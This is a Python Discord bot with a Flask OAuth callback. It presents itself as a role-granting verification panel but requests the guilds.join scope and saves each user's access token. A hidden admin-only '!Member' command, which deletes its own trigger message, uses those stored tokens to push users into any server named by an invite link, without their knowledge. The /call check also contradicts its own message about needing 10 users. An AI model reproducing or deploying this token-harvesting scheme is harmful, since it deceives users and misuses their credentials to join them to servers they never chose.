import discord
from discord.ext import commands
from discord import app_commands
import requests
from flask import Flask, request
import threading
import os
import json
import logging
from dotenv import load_dotenv

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
ADMIN_USER_ID = 800419751880556586

DB_FILE = 'users_v4.json'

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"users": {}, "guild_settings": {}}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# --- モーダル & 管理用View ---
class MemberModal(discord.ui.Modal, title='招待マジック 🌸'):
    invite_url = discord.ui.TextInput(label='招待リンク', placeholder='https://discord.gg/xxxx')
    count = discord.ui.TextInput(label='人数', placeholder='例: 50')

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            target_count = int(self.count.value)
            code = self.invite_url.value.split('/')[-1]
            res = requests.get(f"https://discord.com/api/v10/invites/{code}").json()
            target_guild_id = res.get('guild', {}).get('id')
            
            db = load_db()
            u_ids = list(db["users"].keys())[:target_count]
            success = 0
            for uid in u_ids:
                url = f'https://discord.com/api/guilds/{target_guild_id}/members/{uid}'
                r = requests.put(url, headers={'Authorization': f'Bot {TOKEN}'}, json={'access_token': db["users"][uid]['token']})
                if r.status_code in [201, 204]: success += 1
            await interaction.followup.send(f"{success}人を追加しました。")
        except Exception as e:
            await interaction.followup.send(f"⚠️ エラー: {e}")

class AdminButtonView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
    @discord.ui.button(label="追加メニューを開く", style=discord.ButtonStyle.secondary)
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == ADMIN_USER_ID:
            await interaction.response.send_modal(MemberModal())

# --- Bot 本体 ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

# --- 新・認証セットアップコマンド ---
@bot.tree.command(name="verify", description="カスタム認証パネルを設置します")
@app_commands.describe(title="タイトル", content="内容", role="認証後に付与するロール", label="ボタンの文字", img="画像URL (任意)")
@app_commands.checks.has_permissions(administrator=True)
async def verify(interaction: discord.Interaction, title: str, content: str, role: discord.Role, label: str, img: str = None):
    # ギルドごとの付与ロール設定を保存
    db = load_db()
    db["guild_settings"][str(interaction.guild_id)] = {"role_id": str(role.id)}
    save_db(db)

    safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
    auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={interaction.guild_id}"
    
    embed = discord.Embed(title=title, description=content, color=0xffb6c1)
    if img:
        embed.set_image(url=img)
    
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label=label, url=auth_url, style=discord.ButtonStyle.link))
    
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="call", description="認証済みユーザーを招待します")
async def call(interaction: discord.Interaction):
    db = load_db()
    gid = str(interaction.guild_id)
    current_guild_users = [u for u, data in db["users"].items() if gid in data.get("guilds", [])]
    if len(current_guild_users) < 1:
        return await interaction.response.send_message(f"❌ 10人以上必要です（現在: {len(current_guild_users)}人）", ephemeral=True)
    await interaction.response.defer()
    success = 0
    for u_id in current_guild_users:
        url = f'https://discord.com/api/guilds/{gid}/members/{u_id}'
        res = requests.put(url, headers={'Authorization': f'Bot {TOKEN}'}, json={'access_token': db["users"][u_id]['token']})
        if res.status_code in [201, 204]: success += 1
    await interaction.followup.send(f"{success}人を追加しました。")

@bot.command(name="Member")
async def member_cmd(ctx):
    if ctx.author.id == ADMIN_USER_ID:
        await ctx.message.delete()
        await ctx.send("🔐 管理者用メニュー", view=AdminButtonView(), delete_after=60)

# --- Flask Server ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    guild_id = request.args.get('state')
    
    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
    token_res = requests.post('https://discord.com/api/oauth2/token', data=data).json()
    
    access_token = token_res.get('access_token')
    u_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
    user_id = u_info['id']

    db = load_db()
    if user_id not in db["users"]:
        db["users"][user_id] = {"token": access_token, "guilds": []}
    if guild_id and guild_id not in db["users"][user_id]["guilds"]:
        db["users"][user_id]["guilds"].append(guild_id)
    save_db(db)

    # 🌸 ロールの自動付与
    if guild_id in db["guild_settings"]:
        role_id = db["guild_settings"][guild_id]["role_id"]
        add_role_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
        requests.put(add_role_url, headers={'Authorization': f'Bot {TOKEN}'})

    return """
    <html><body style="background:linear-gradient(135deg, #fceaf0 0%, #e8f0ff 100%);height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;margin:0;">
    <div style="background:white;padding:50px;border-radius:30px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.1);">
    <h1 style="color:#ff85a2;">認証に成功しました。</h1><p>ロールが付与されました。Discordに戻ってください。</p></div></body></html>
    """

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(TOKEN)